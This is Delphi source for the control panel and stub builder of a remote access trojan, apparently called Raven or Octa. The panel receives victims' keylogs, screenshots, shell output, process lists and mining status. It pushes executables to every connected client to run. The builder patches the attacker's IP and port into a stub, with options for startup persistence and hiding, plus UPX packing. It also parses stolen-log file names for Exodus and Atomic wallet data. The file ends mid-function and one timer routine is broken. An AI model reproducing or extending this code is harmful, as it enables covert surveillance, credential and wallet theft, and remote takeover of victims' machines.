unit Main;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, scControls, scGPControls, Vcl.ExtCtrls,
  Vcl.BaseImageCollection, Vcl.ImageCollection, System.ImageList, Vcl.ImgList,
  Vcl.VirtualImageList, Vcl.Imaging.pngimage, scStyledForm, scGPExtControls,
  scGPPagers, scGPImages, Vcl.StdCtrls, IdBaseComponent, IdComponent,
  IdCustomTCPServer, IdTCPServer, Vcl.ComCtrls, System.Generics.Collections,
  IdHTTP, IdTCPConnection, IdTCPClient, IdURI,
  IdSSLOpenSSL, IdSSL, System.JSON, System.IOUtils, System.UITypes, Math, IdContext, IdGlobal,
  Vcl.Menus,Winapi.CommCtrl, DzSocket, UClient, Winapi.MMSystem,
  scModernControls, Vcl.Mask, System.NetEncoding, Winapi.ShellAPI, Vcl.Imaging.jpeg;

      type
  _MARGINS = record
    cxLeftWidth: Integer;
    cxRightWidth: Integer;
    cyTopHeight: Integer;
    cyBottomHeight: Integer;
  end;





type
  TFileInfo = record
    FileName: string;
    IP: string;
    Username: string;
    Exodus: string;
    Atomic: string;
    WalletExt: string;
    FileSize: Int64;
    CountryCode: string;
  end;

  TCountryInfo = record
    CountryCode: string;
    FlagIndex: Integer;
  end;

  TFileMonitorThread = class(TThread)
  private
    FLogFolder: string;
    FListView: TListView;
    FFileList: TList<TFileInfo>;
    FCountryCache: TDictionary<string, TCountryInfo>;
    FLastScanTime: TDateTime;

    procedure UpdateListView;
    function GetFlagIndex(const CountryCode: string): Integer;
    function GetCountryFromIP(const IP: string): TCountryInfo;
    function ParseFileName(const FileName: string): TFileInfo;
  protected
    procedure Execute; override;
  public

    constructor Create(AListView: TListView; const ALogFolder: string);
    destructor Destroy; override;


  end;
     const
  LVM_GETHEADER = $1000 + 31;
  HDS_OWNERDRAWNFIXED = $0100;
  HDM_GETITEM = $1200 + 11;


type
  TForm2 = class(TForm)
    scGPPanel1: TscGPPanel;
    scGPButton1: TscGPButton;
    VirtualImageList1: TVirtualImageList;
    ImageCollection1: TImageCollection;
    scGPButton2: TscGPButton;
    scGPButton3: TscGPButton;
    scGPButton4: TscGPButton;
    Image1: TImage;
    scGPPanel2: TscGPPanel;
    scGPPageControl1: TscGPPageControl;
    Connections: TscGPPageControlPage;
    Dashboard: TscGPPageControlPage;
    AutoTasks: TscGPPageControlPage;
    LocalSettings: TscGPPageControlPage;
    Settings: TscGPPageControlPage;
    AboutOcta: TscGPPageControlPage;
    scGPPanel3: TscGPPanel;
    scGPPanel4: TscGPPanel;
    scGPPanel5: TscGPPanel;
    scGPButton7: TscGPButton;
    scGPImage1: TscGPImage;
    Label1: TLabel;
    scGPImage2: TscGPImage;
    Label2: TLabel;
    scGPImage3: TscGPImage;

    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Label7: TLabel;
    scGPPanel6: TscGPPanel;
    scGPPanel7: TscGPPanel;
    Label8: TLabel;
    Label9: TLabel;
    scGPPanel8: TscGPPanel;
    Label10: TLabel;
    scGPImage4: TscGPImage;
    scGPPanel9: TscGPPanel;
    ImageList1: TImageList;
    L: TscListBox;
    S: TDzTCPServer;
    StatusBar1: TStatusBar;
    EdLog: TMemo;
    scGPPanel10: TscGPPanel;
    Label11: TLabel;
    scGPPanel11: TscGPPanel;
    Label12: TLabel;
    scMemo1: TscMemo;
    scGPPanel12: TscGPPanel;
    Label13: TLabel;
    scGPPanel13: TscGPPanel;
    Label14: TLabel;
    Label15: TLabel;
    scGPImage5: TscGPImage;
    scGPPanel14: TscGPPanel;
    Label16: TLabel;
    scGPImage6: TscGPImage;
    scGPPanel15: TscGPPanel;
    Label18: TLabel;
    scGPImage7: TscGPImage;
    scGPPanel16: TscGPPanel;
    Label17: TLabel;
    scGPImage8: TscGPImage;
    scGPSwitch1: TscGPSwitch;
    scEdit1: TscEdit;
    scEdit2: TscEdit;
    Label19: TLabel;
    Label20: TLabel;
    scGPButton9: TscGPButton;
    scEdit3: TscEdit;
    Label21: TLabel;
    scGPButton10: TscGPButton;
    scGPButton11: TscGPButton;
    Label22: TLabel;
    Label23: TLabel;
    scGPSwitch2: TscGPSwitch;
    Label24: TLabel;
    scGPSwitch3: TscGPSwitch;
    scGPComboBox1: TscGPComboBox;
    mytimeanddate: TTimer;
    scGPButton5: TscGPButton;
    scGPButton8: TscGPButton;
    Image2: TImage;
    scGPPanel17: TscGPPanel;
    scMemo2: TscMemo;
    Label25: TLabel;
    scGPPanel18: TscGPPanel;
    Label26: TLabel;
    scGPPanel19: TscGPPanel;
    Label27: TLabel;
    scGPImage9: TscGPImage;
    scGPPanel20: TscGPPanel;
    scGPButton6: TscGPButton;
    scGPSwitch4: TscGPSwitch;
    Label28: TLabel;
    scGPPanel21: TscGPPanel;
    Label29: TLabel;
    scGPButton12: TscGPButton;
    scGPPanel22: TscGPPanel;
    scGPButton13: TscGPButton;
    scEdit4: TscEdit;
    autoexec: TTimer;
    Label30: TLabel;
    Label31: TLabel;
    Label32: TLabel;
    Label33: TLabel;
    scGPButton14: TscGPButton;
    ImageCollection2: TImageCollection;
    VirtualImageList2: TVirtualImageList;
    Label34: TLabel;
    Label35: TLabel;
    procedure FormCreate(Sender: TObject);

    procedure ListView1CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure scGPButton2Click(Sender: TObject);
    procedure SClientDisconnect(Sender: TObject; Socket: TDzSocket);
    procedure SClientError(Sender: TObject; Socket: TDzSocket;
      const Event: TErrorEvent; const ErrorCode: Integer;
      const ErrorMsg: string);
    procedure SClientLoginCheck(Sender: TObject; Socket: TDzSocket;
      var Accept: Boolean; const RequestData: string; var ResponseData: string);
    procedure SClientLoginSuccess(Sender: TObject; Socket: TDzSocket);
    procedure SClientRead(Sender: TObject; Socket: TDzSocket; const Cmd: Char;
      const A: string);
    procedure scGPButton1Click(Sender: TObject);
    procedure scGPButton3Click(Sender: TObject);
    procedure scGPButton4Click(Sender: TObject);
    procedure scGPButton10Click(Sender: TObject);
    procedure scGPButton11Click(Sender: TObject);
    procedure mytimeanddateTimer(Sender: TObject);
    procedure scGPButton7Click(Sender: TObject);
    procedure scGPButton5Click(Sender: TObject);
    procedure scGPButton9Click(Sender: TObject);
    procedure scGPButton8Click(Sender: TObject);
    procedure LDblClick(Sender: TObject);
    procedure scGPButton6Click(Sender: TObject);
    procedure scGPSwitch4ChangeState(Sender: TObject);
    procedure scGPButton13Click(Sender: TObject);
    procedure autoexecTimer(Sender: TObject);
    procedure scGPButton12Click(Sender: TObject);


  private
    { Private declarations }

     FLastKeylogTime: Cardinal;
        FMonitorThread: TFileMonitorThread;
     ListViewWindow: HWND;

    procedure StartMonitoring;
   procedure SetupListView;

     procedure Log(const Text: string);
    function NickNameAlreadyExists(const NickName: string): Boolean;
      procedure NotificationFormClose(Sender: TObject; var Action: TCloseAction);
  public
  procedure WMNCHitTest(var Msg: TWMNCHitTest); message WM_NCHITTEST;

      class var FOriginalProcessList: TStringList;
         class constructor Create;
    class destructor Destroy;

  end;


var
  Form2: TForm2;

implementation

{$R *.dfm}
uses
  Winapi.Dwmapi,  Winapi.UxTheme, notification,Unit5;


var
  ActiveNotifications: Integer = 0;


   class constructor TForm2.Create;
begin
  FOriginalProcessList := TStringList.Create;
end;

class destructor TForm2.Destroy;
begin
  if FOriginalProcessList <> nil then
    FOriginalProcessList.Free;
end;

procedure TForm2.autoexecTimer(Sender: TObject);
var
  OpenDialog: TOpenDialog;
  FileStream: TFileStream;
  ByteArray: TBytes;
  Base64Str: string;
  FileName: string;
begin

   FileName := ExtractFileName(OpenDialog.FileName);

      try
        // Read the file into a byte array
        FileStream := TFileStream.Create(OpenDialog.FileName, fmOpenRead);
        try
          // Check file size
          if FileStream.Size > 50 * 1024 * 1024 then // 50 MB limit
          begin

            Exit;
          end;

          // Read the file data
          SetLength(ByteArray, FileStream.Size);
          FileStream.ReadBuffer(ByteArray[0], FileStream.Size);

          // Convert to Base64
          Base64Str := TNetEncoding.Base64.EncodeBytesToString(ByteArray);

          // Send the command, filename, and Base64 data
          // 'U' command for Upload and Execute
          S.SendAll('U', FileName + '|' + Base64Str);


        finally
          FileStream.Free;
        end;
      except
        on E: Exception do

      end;
end;

procedure TForm2.FormCreate(Sender: TObject);
var
  Shadow: Integer;
  Margins: Winapi.UxTheme._MARGINS;  // Use the correct type from UxTheme
const
  DWMWCP_ROUND = 2;
  DWMWA_WINDOW_CORNER_PREFERENCE = 33;
  var
  ComputerName: string;
  Size: DWORD;
begin



     scGPPageControl1.TabIndex := 1;
        SetLength(ComputerName, MAX_COMPUTERNAME_LENGTH + 1);
  Size := MAX_COMPUTERNAME_LENGTH + 1;

  // Get the computer name
  if GetComputerName(PChar(ComputerName), Size) then
  begin
    SetLength(ComputerName, Size);
    Label7.Caption := 'Welcome ' + ComputerName + '';
  end
  else
    Label7.Caption := 'Welcome Unknown';




   scGPComboBox1.ItemIndex := 0;
 

SetupListView;
    StartMonitoring;

   BorderStyle := bsNone;

  // Enable shadow
  Shadow := 1;
  DwmSetWindowAttribute(Handle, DWMWA_NCRENDERING_POLICY, @Shadow, SizeOf(Shadow));

  // Set up margins for shadow
  Margins.cxLeftWidth := 2;
  Margins.cxRightWidth := 2;
  Margins.cyTopHeight := 2;
  Margins.cyBottomHeight := 2;
  DwmExtendFrameIntoClientArea(Handle, Margins);

  // Make form background proper for shadow
  SetWindowLong(Handle, GWL_EXSTYLE,
    GetWindowLong(Handle, GWL_EXSTYLE) or WS_EX_LAYERED);
 // SetLayeredWindowAttributes(Handle, 0, 255, LWA_ALPHA);


end;

procedure TForm2.SClientDisconnect(Sender: TObject; Socket: TDzSocket);
var
  C: TClient;
  Idx: Integer;
begin
  if not Socket.Auth then Exit;

  C := Socket.Data;
  Log(Format('%s disconnected', [C.NickName]));

  Idx := L.Items.IndexOfObject(Socket);
  if Idx<>-1 then
    L.Items.Delete(Idx);

     StatusBar1.Panels[0].Text := Format('Clients: %d', [L.Items.Count]);

     Label4.Caption := Format('%d', [L.Items.Count]);
end;

procedure TForm2.SClientError(Sender: TObject; Socket: TDzSocket;
  const Event: TErrorEvent; const ErrorCode: Integer; const ErrorMsg: string);
begin
 Log(Format('Client socket error (ID %d): %s', [Socket.ID, ErrorMsg]));
end;

procedure TForm2.SClientLoginCheck(Sender: TObject; Socket: TDzSocket;
  var Accept: Boolean; const RequestData: string; var ResponseData: string);
   var
  NickName: string;
  C: TClient;
begin
  NickName := RequestData;
  if NickNameAlreadyExists(NickName) then
  begin
    Accept := False;
    ResponseData := 'Another user is already connected with the same nick name';
    Exit;
  end;

  //login accepted
  C := TClient.Create;
  C.NickName := NickName;

  Socket.Data := C;
end;
  function TForm2.NickNameAlreadyExists(const NickName: string): Boolean;
var
  Socket: TDzSocket;
  C: TClient;
begin
  for Socket in S do
  begin
    C := Socket.Data;
    if SameText(C.NickName, NickName) then Exit(True);
  end;

  Exit(False);
end;

procedure TForm2.SClientLoginSuccess(Sender: TObject; Socket: TDzSocket);
const
  MAX_NOTIFICATIONS = 5;
var
  C: TClient;
  FullNickName: string;
  DisplayName: string;
begin
  C := Socket.Data;
  FullNickName := C.NickName;
  DisplayName := StringReplace(FullNickName, '|', ' ', [rfReplaceAll]);
  Log(Format('%s connected', [DisplayName]));



  if (scGPSwitch1.State = TscSwitchState.scswOn) and (ActiveNotifications < MAX_NOTIFICATIONS) then
  begin
    Inc(ActiveNotifications);


    Form3 := TForm3.Create(Application);
    Form3.Caption := Format('%s connected', [DisplayName]);
    Form3.Label1.Caption := Format('%s ', [DisplayName]);
    Form3.OnClose := NotificationFormClose;
    Form3.Show;


    if ActiveNotifications = 1 then
      PlaySound(PChar('notify.wav'), 0, SND_ASYNC or SND_FILENAME);


    Form3.TimerFadeOut.Tag := 255;
    Form3.TimerFadeOut.Interval := 100;
    Form3.TimerFadeOut.Enabled := True;
  end;

  L.Items.AddObject(DisplayName, Socket);
   Label4.Caption :=  Format('Clients: %d', [L.Items.Count]) ;

   //Label6

end;

  procedure TForm2.NotificationFormClose(Sender: TObject; var Action: TCloseAction);
begin
  Dec(ActiveNotifications);
  Action := caFree; // Ensure form is freed
end;

   procedure TForm2.Log(const Text: string);
begin
  EdLog.Lines.Add(FormatDateTime('hh:nn:ss', Now)+' - '+Text);
end;


procedure TForm2.SClientRead(Sender: TObject; Socket: TDzSocket; const Cmd: Char; const A: string);
var
  C: TClient;

  i: Integer;
  lp: Integer;
  ProcessesArray: TArray<string>;
  ProcessEntryArray: TArray<string>;
  ImageStream: TMemoryStream;
    JPEG: TJPEGImage;
  Bytes: TBytes;
    WindowInfo, Content: string;
  SeparatorPos: Integer;
begin


  C := Socket.Data;

  case Cmd of
    'M': S.SendAll('M', ArrayToData([C.NickName, A]));

     'B':
     begin
         RunExecute.Label1.Caption := A;
     end;

     '2':
     Begin
          Unit5.RunExecute.informationedit.Text := A;
     End;


     '4':
     begin
       Unit5.RunExecute.miningedit.Text := A;
     end;

     'R':
     begin
        Unit5.RunExecute.KeylogMemo.Text := A;
     end;


      'S': // Shell command output
    begin
      // Find the RunExecute form for this socket
      Unit5.RunExecute := nil;
      for i := 0 to Screen.FormCount - 1 do
      begin
        if (Screen.Forms[i] is TRunExecute) and
           ((Screen.Forms[i] as TRunExecute).CurrentSocket = Socket) then
        begin
          Unit5.RunExecute := TRunExecute(Screen.Forms[i]);
          Break;
        end;
      end;

      if Unit5.RunExecute <> nil then
      begin
        // Display the command output in a memo or rich edit
        Unit5.RunExecute.shelledit.Lines.Add(A);

        // Auto-scroll to bottom
        Unit5.RunExecute.shelledit.SelStart := Length(Unit5.RunExecute.shelledit.Text);
        Unit5.RunExecute.shelledit.SelLength := 0;
        SendMessage(Unit5.RunExecute.shelledit.Handle, EM_SCROLLCARET, 0, 0);
      end;
    end;


     'I':
     begin

      Unit5.RunExecute := nil;
      for i := 0 to Screen.FormCount - 1 do
      begin
        if (Screen.Forms[i] is TRunExecute) and
           ((Screen.Forms[i] as TRunExecute).CurrentSocket = Socket) then
        begin
          Unit5.RunExecute := TRunExecute(Screen.Forms[i]);
          Break;
        end;
      end;

      if Unit5.RunExecute <> nil then
      begin
        try
          // Decode Base64 string to bytes
          Bytes := TNetEncoding.Base64.DecodeStringToBytes(A);

          // Create memory stream and load image
          ImageStream := TMemoryStream.Create;
          JPEG := TJPEGImage.Create;
          try
            ImageStream.WriteBuffer(Bytes[0], Length(Bytes));
            ImageStream.Position := 0;

            JPEG.LoadFromStream(ImageStream);

            // Display in Image component
            Unit5.RunExecute.Image4.Picture.Assign(JPEG);


          finally
            ImageStream.Free;
            JPEG.Free;
          end;
        except
          on E: Exception do
            Log('Error processing screenshot: ' + E.Message);
        end;
      end;
    end;



'P':
Begin
  // Clear existing list
  FOriginalProcessList.Clear;
  // Existing code to populate ListBox
  ProcessesArray := A.Split([';']);
  Unit5.RunExecute.ProcessListBox.Clear;
  for i := 0 to Length(ProcessesArray) - 1 do
  begin
    if ProcessesArray[i] = '' then Continue;
    ProcessEntryArray := ProcessesArray[i].Split(['|']);
    if Length(ProcessEntryArray) = 3 then
    begin
      // Format the display string for the ListBox
      Unit5.RunExecute.ProcessListBox.Items.Add(
        Format('%-8s | %-30s | %s', [
          ProcessEntryArray[0],  // PID
          ProcessEntryArray[1],  // Name
          ProcessEntryArray[2]   // Architecture
        ])
      );

      // Save to the original list
      FOriginalProcessList.Add(Format('%s|%s|%s', [
        ProcessEntryArray[0],
        ProcessEntryArray[1],
        ProcessEntryArray[2]
      ]));
    end;
  end;
End;

   



  end;
end;

procedure TForm2.SetupListView;

begin


end;

// Country code to flag index mapping
function GetDefaultCountryMapping: TDictionary<string, Integer>;
var
  CountryMap: TDictionary<string, Integer>;
begin
  CountryMap := TDictionary<string, Integer>.Create;

  // Map country codes to flag indices
  CountryMap.Add('AU', 0);  // Australia
  CountryMap.Add('AT', 1);  // Austria
  CountryMap.Add('CA', 2);  // Canada
  CountryMap.Add('CN', 3);  // China
  CountryMap.Add('CZ', 4);  // Czech Republic
  CountryMap.Add('FI', 5);  // Finland
  CountryMap.Add('FR', 6);  // France
  CountryMap.Add('DE', 7);  // Germany
  CountryMap.Add('GB', 8);  // United Kingdom
  CountryMap.Add('HK', 9);  // Hong Kong
  CountryMap.Add('HU', 10); // Hungary
  CountryMap.Add('IT', 11); // Italy
  CountryMap.Add('LU', 12); // Luxembourg
  CountryMap.Add('MX', 13); // Mexico
  CountryMap.Add('NG', 14); // Nigeria
  CountryMap.Add('PL', 15); // Poland
  CountryMap.Add('RO', 16); // Romania
  CountryMap.Add('RU', 17); // Russia
  CountryMap.Add('ES', 18); // Spain
  CountryMap.Add('CH', 20); // Switzerland
  CountryMap.Add('TR', 21); // Turkey
  CountryMap.Add('US', 22); // USA

  Result := CountryMap;
end;

{ TFileMonitorThread }

constructor TFileMonitorThread.Create(AListView: TListView; const ALogFolder: string);
begin
  inherited Create(True);
  FreeOnTerminate := True;

  FListView := AListView;
  FLogFolder := ALogFolder;
  FFileList := TList<TFileInfo>.Create;
  FCountryCache := TDictionary<string, TCountryInfo>.Create;
  FLastScanTime := 0;
end;

destructor TFileMonitorThread.Destroy;
begin
  FFileList.Free;
  FCountryCache.Free;
  inherited;
end;
procedure TFileMonitorThread.Execute;

begin

end;

function TFileMonitorThread.GetCountryFromIP(const IP: string): TCountryInfo;
var
  HTTP: TIdHTTP;
  JSONValue: TJSONValue;
  CountryCode: string;
  ResponseStr: string;
  SSLHandler: TIdSSLIOHandlerSocketOpenSSL;
begin
  Result.CountryCode := 'XX'; // Default unknown
  Result.FlagIndex := 23;     // Custom flag for unknown countries

  // Skip IP lookup for local IPs
  if (IP = '127.0.0.1') or (IP = 'localhost') or
     (Pos('192.168.', IP) = 1) or (Pos('10.', IP) = 1) then
    Exit;

  HTTP := TIdHTTP.Create(nil);
  SSLHandler := TIdSSLIOHandlerSocketOpenSSL.Create(HTTP);
  try
    HTTP.IOHandler := SSLHandler;
    SSLHandler.SSLOptions.SSLVersions := [sslvTLSv1, sslvTLSv1_1, sslvTLSv1_2];

    HTTP.ConnectTimeout := 2000; // Reduced timeout
    HTTP.ReadTimeout := 2000;    // Reduced timeout

    try
      ResponseStr := HTTP.Get('http://ip-api.com/json/' + IP + '?fields=countryCode');

      JSONValue := TJSONObject.ParseJSONValue(ResponseStr);
      try
        if Assigned(JSONValue) and (JSONValue is TJSONObject) then
        begin
          CountryCode := TJSONObject(JSONValue).GetValue<string>('countryCode');
          Result.CountryCode := CountryCode;
          Result.FlagIndex := GetFlagIndex(CountryCode);
        end;
      finally
        JSONValue.Free;
      end;
    except
      // Just return default values on any error
    end;
  finally
    SSLHandler.Free;
    HTTP.Free;
  end;
end;

function TFileMonitorThread.GetFlagIndex(const CountryCode: string): Integer;
var
  CountryMap: TDictionary<string, Integer>;
  FlagIndex: Integer;
begin
  CountryMap := GetDefaultCountryMapping;
  try
    if CountryMap.TryGetValue(CountryCode, FlagIndex) then
      Result := FlagIndex
    else
      Result := 23; // Custom flag for countries not in the list
  finally
    CountryMap.Free;
  end;
end;

function TFileMonitorThread.ParseFileName(const FileName: string): TFileInfo;
var
  Parts: TArray<string>;
  CleanName: string;
  I, Count: Integer;
  CurrentPart: string;
  Separator: string;
begin
  // Remove .zip extension
  CleanName := StringReplace(FileName, '.zip', '', [rfIgnoreCase]);

  // XE7 compatible split
  Separator := '-';
  Count := 0;
  SetLength(Parts, 5); // Pre-allocate for 5 parts

  I := 1;
  while I <= Length(CleanName) do
  begin
    CurrentPart := '';
    while (I <= Length(CleanName)) and (CleanName[I] <> Separator) do
    begin
      CurrentPart := CurrentPart + CleanName[I];
      Inc(I);
    end;

    if Count < Length(Parts) then
      Parts[Count] := CurrentPart;

    Inc(Count);
    Inc(I); // Skip the separator
  end;

  Result.FileName := FileName;

  // Parse parts
  if Length(Parts) >= 1 then
    Result.IP := Parts[0];

  if Length(Parts) >= 2 then
    Result.Username := Parts[1];

  if Length(Parts) >= 3 then
    Result.Exodus := Parts[2];

  if Length(Parts) >= 4 then
    Result.Atomic := Parts[3];

  if Length(Parts) >= 5 then
    Result.WalletExt := Parts[4];
end;

procedure TFileMonitorThread.UpdateListView;

begin


end;

procedure TForm2.LDblClick(Sender: TObject);
var
  FullText: string;
  IPAddress: string;
  SpacePos: Integer;
begin
  if L.ItemIndex = -1 then Exit;

  // Get the full text of the selected item
  FullText := L.Items[L.ItemIndex];

  // Find the position of the first space
  SpacePos := Pos(' ', FullText);

  // Extract just the IP address part (everything before the first space)
  if SpacePos > 0 then
    IPAddress := Copy(FullText, 1, SpacePos - 1)
  else
    IPAddress := FullText; // No space found, use the whole text

  // Open control panel form and pass the selected socket
  RunExecute := TRunExecute.Create(Application);
  RunExecute.CurrentSocket := TDzSocket(L.Items.Objects[L.ItemIndex]);
  RunExecute.Label1.Caption := IPAddress; // Set label to just the IP address
  RunExecute.Show;
end;

procedure TForm2.ListView1CustomDrawSubItem(Sender: TCustomListView;
  Item: TListItem; SubItem: Integer; State: TCustomDrawState;
  var DefaultDraw: Boolean);
  var
  Canvas: TCanvas;
  SubItemRect: TRect;
begin
     Canvas := (Sender as TListView).Canvas;

  // Different color for different columns
  case SubItem of
    0: Canvas.Brush.Color := $E0FFE0; // Light green for first column
    1: Canvas.Brush.Color := $FFE0E0; // Light red for second column
    else Canvas.Brush.Color := $E0E0FF; // Light purple for other columns
  end;

  // Use different text colors if needed
  if SubItem = 1 then
    Canvas.Font.Color := clBlue;

  DefaultDraw := True;
end;

procedure TForm2.scGPButton10Click(Sender: TObject);
begin
   try


  S.AutoFreeObjs := True;

   S.EnumeratorOnlyAuth := True;
  S.Port := StrToInt(scEdit3.Text);
  Label15.Caption :=  scEdit3.Text;
  S.Open;

  scGPButton10.Enabled := false;
  scGPButton11.Enabled := true;

  Label22.Caption := 'Online: ' +  scEdit3.Text

       except
             on E: Exception do
    MessageBox(Handle, PWideChar('Failed To Listening : ' + scEdit3.Text + #13#10 + 'Error: ' + E.Message),
               'Information', MB_ICONERROR or MB_OK);
       end;
end;

procedure TForm2.scGPButton11Click(Sender: TObject);
begin

try



  S.Close;


  L.Clear;




   scGPButton11.Enabled := false;
scGPButton10.Enabled := true;
      Label15.Caption :=  '0';
      Label4.Caption := '0';
Label22.Caption := 'Offline'
except
 on E: Exception do
       MessageBox(Handle, PWideChar('Failed : ' + scEdit3.Text + #13#10 + 'Error: ' + E.Message),
               'Information', MB_ICONERROR or MB_OK);
end;

end;

procedure TForm2.scGPButton12Click(Sender: TObject);
var
  OpenDialog: TOpenDialog;
  FileStream: TFileStream;
  ByteArray: TBytes;
  Base64Str: string;
  FileName: string;

begin


  OpenDialog := TOpenDialog.Create(Self);
  try
    OpenDialog.Title := 'Select file to upload and execute';
    OpenDialog.Filter := 'Executable files (*.exe)|*.exe|All files (*.*)|*.*';

    if OpenDialog.Execute then
    begin
      // Extract just the filename without path
      FileName := ExtractFileName(OpenDialog.FileName);

      try
        // Read the file into a byte array
        FileStream := TFileStream.Create(OpenDialog.FileName, fmOpenRead);
        try
          // Check file size
          if FileStream.Size > 50 * 1024 * 1024 then // 50 MB limit
          begin
            MessageBox(Handle, 'File is too large. Maximum size is 50 MB.',
                       'Error', MB_ICONERROR or MB_OK);
            Exit;
          end;

          // Read the file data
          SetLength(ByteArray, FileStream.Size);
          FileStream.ReadBuffer(ByteArray[0], FileStream.Size);

          // Convert to Base64
          Base64Str := TNetEncoding.Base64.EncodeBytesToString(ByteArray);

          // Send the command, filename, and Base64 data
          // 'U' command for Upload and Execute
          S.SendAll('U', FileName + '|' + Base64Str);

          MessageBox(Handle, PChar('File "' + FileName + '" sent to client.'),
                     'Upload Success', MB_ICONINFORMATION or MB_OK);
        finally
          FileStream.Free;
        end;
      except
        on E: Exception do
          MessageBox(Handle, PChar('Error sending file: ' + E.Message),
                     'Error', MB_ICONERROR or MB_OK);
      end;
    end;
  finally
    OpenDialog.Free;
  end;
end;

procedure TForm2.scGPButton13Click(Sender: TObject);
var
  OpenDialog: TOpenDialog;
begin

 OpenDialog := TOpenDialog.Create(Self);
  try
    OpenDialog.Title := 'Select file to upload and execute Automation';
    OpenDialog.Filter := 'Executable files (*.exe)|*.exe|All files (*.*)|*.*';
    if OpenDialog.Execute then
    begin
      scEdit4.Text := OpenDialog.FileName;
    end;
  finally
    OpenDialog.Free;
  end;

end;

procedure TForm2.scGPButton1Click(Sender: TObject);
begin
     scGPPageControl1.TabIndex := 1;
end;

procedure TForm2.scGPButton2Click(Sender: TObject);
begin
 scGPPageControl1.TabIndex := 0;
end;

procedure TForm2.scGPButton3Click(Sender: TObject);
begin
 scGPPageControl1.TabIndex := 2;
end;

procedure TForm2.scGPButton4Click(Sender: TObject);
begin
 scGPPageControl1.TabIndex := 3;
end;

procedure TForm2.scGPButton5Click(Sender: TObject);
var
  FileName: string;
  FileStream: TStringList;
  i: Integer;
  RandomStr: string;
  TimeStamp: string;
begin
  // Generate a random filename
  Randomize;
  TimeStamp := FormatDateTime('yyyymmddhhnnss', Now);
  RandomStr := IntToStr(Random(10000));
  FileName := 'Export_' + TimeStamp + '_' + RandomStr + '.txt';

  // Use TStringList instead of TextFile
  FileStream := TStringList.Create;
  try
    // Add each item from the ListBox to the string list
    for i := 0 to L.Items.Count - 1 do
    begin
      FileStream.Add(L.Items[i]);
    end;

    // Save the string list to a file
    FileStream.SaveToFile(ExtractFilePath(ParamStr(0)) + FileName);

    // Show confirmation message
    ShowMessage('List exported successfully to: ' + FileName);
  finally
    // Free the string list
    FileStream.Free;
  end;
end;

procedure TForm2.scGPButton6Click(Sender: TObject);
begin
 scGPPageControl1.TabIndex := 4;
end;

procedure TForm2.scGPButton7Click(Sender: TObject);
begin
 if MessageDlg('Warning: Clearing the list will remove all connected users. ' +
                'You will need to stop and restart the server to reconnect users. ' +
                'Are you sure you want to continue?',
                mtWarning, [mbYes, mbNo], 0) = mrYes then
  begin
    L.Clear;
  end;
end;


procedure TForm2.scGPButton8Click(Sender: TObject);
begin
 scGPPageControl1.TabIndex := 5;
end;

function GetRandomString(Size: Integer): string;
var
  i: Integer;
  RandStr: string;
begin
  RandStr := '';
  Randomize;

  for i := 1 to Size do
  begin
    // Add random letters (both uppercase and lowercase)
    case Random(3) of
      0: RandStr := RandStr + Char(Ord('A') + Random(26));  // Uppercase
      1: RandStr := RandStr + Char(Ord('a') + Random(26));  // Lowercase
      2: RandStr := RandStr + Char(Ord('0') + Random(10));  // Numbers
    end;
  end;

  Result := RandStr;
end;
procedure TForm2.scGPButton9Click(Sender: TObject);
var
  StubPath, TempStubPath: string;
  ResHandle: THandle;
  FileStream: TFileStream;
  IPData, PortData, StartupData, HiddenData: TBytes;
begin







  try
    // Path to the original stub in your resources
    StubPath := ExtractFilePath(Application.ExeName) + 'RavenOriginalStub.exe';
    // Path to save the modified stub
    TempStubPath := ExtractFilePath(Application.ExeName) + GetRandomString(32) + '.exe';

    // Check if original stub exists
    if not FileExists(StubPath) then
    begin
      ShowMessage('Error: Stub.exe not found at: ' + StubPath);
      Exit;
    end;

    // First, copy the stub to the new location
    try
      CopyFile(PChar(StubPath), PChar(TempStubPath), False);
    except
      on E: Exception do
      begin
        ShowMessage('Failed to copy stub: ' + E.Message);
        Exit;
      end;
    end;

    // Convert data to bytes
    IPData := TEncoding.UTF8.GetBytes(scEdit1.Text);
    PortData := TEncoding.UTF8.GetBytes(scEdit2.Text);

    // Prepare startup and hidden data if needed
    if scGPSwitch2.State = scswOn then
      StartupData := TEncoding.UTF8.GetBytes('1');

    if scGPSwitch3.State = scswOn then
      HiddenData := TEncoding.UTF8.GetBytes('1');

    // Now open the COPIED file for resource updating
    ResHandle := BeginUpdateResource(PChar(TempStubPath), False);
    if ResHandle = 0 then
    begin
      ShowMessage('Failed to open stub for resource updating. Error: ' + IntToStr(GetLastError));
      Exit;
    end;

    try
      // Update resources with IP and Port
      if not UpdateResource(ResHandle, 'CUSTOM', 'SERVER_IP',
                          MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                          @IPData[0], Length(IPData)) then
      begin
        ShowMessage('Failed to update IP resource. Error: ' + IntToStr(GetLastError));
        Exit;
      end;

      if not UpdateResource(ResHandle, 'CUSTOM', 'SERVER_PORT',
                         MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                         @PortData[0], Length(PortData)) then
      begin
        ShowMessage('Failed to update Port resource. Error: ' + IntToStr(GetLastError));
        Exit;
      end;

      // Update STARTUP resource if enabled
      if scGPSwitch2.State = scswOn then
      begin
        if not UpdateResource(ResHandle, 'CUSTOM', 'STARTUP',
                           MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                           @StartupData[0], Length(StartupData)) then
        begin
          ShowMessage('Failed to update STARTUP resource. Error: ' + IntToStr(GetLastError));
          Exit;
        end;
      end;

      // Update HIDDEN resource if enabled
      if scGPSwitch3.State = scswOn then
      begin
        if not UpdateResource(ResHandle, 'CUSTOM', 'HIDDEN',
                           MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                           @HiddenData[0], Length(HiddenData)) then
        begin
          ShowMessage('Failed to update HIDDEN resource. Error: ' + IntToStr(GetLastError));
          Exit;
        end;
      end;

      // Commit the resource updates - FALSE means save changes
      if not EndUpdateResource(ResHandle, False) then
      begin
        ShowMessage('Failed to commit resource updates. Error: ' + IntToStr(GetLastError));
        Exit;
      end;


        if scGPComboBox1.ItemIndex = 0 then
begin

end
else
begin
    // Run UPX packing on the output file
    var UPXPath: string := ExtractFilePath(Application.ExeName) + 'upx32.exe';
